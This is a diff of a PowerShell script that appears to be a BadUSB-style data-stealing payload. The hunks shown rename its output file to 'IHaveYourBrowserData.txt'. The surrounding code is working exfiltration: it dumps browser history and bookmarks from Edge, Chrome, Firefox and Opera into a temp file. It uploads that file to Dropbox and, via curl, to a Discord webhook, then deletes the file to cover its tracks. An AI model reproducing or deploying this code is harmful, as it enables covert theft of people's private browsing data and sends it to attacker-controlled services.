@@ -32,19 +32,19 @@ function Get-BrowserData {
     } 
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\IHaveYourBrowserData.txt
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\IHaveYourBrowserData.txt
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\IHaveYourBrowserData.txt
 
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMPIHaveYourBrowserData.txt
 
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\IHaveYourBrowserData.txt
 
-Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\IHaveYourBrowserData.txt
 
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\IHaveYourBrowserData.txt
 
 # Upload output file to dropbox
 
@@ -68,7 +68,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\IHaveYourBrowserData.txt}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -95,9 +95,9 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\IHaveYourBrowserData.txt}
 
 
 ############################################################################################################################################################
-Upload-Discord -file "$env:TEMP/--BrowserData.txt"
-RI $env:TEMP/--BrowserData.txt
+Upload-Discord -file "$env:TEMP/IHaveYourBrowserData.txt"
+RI $env:TEMP/IHaveYourBrowserData.txt
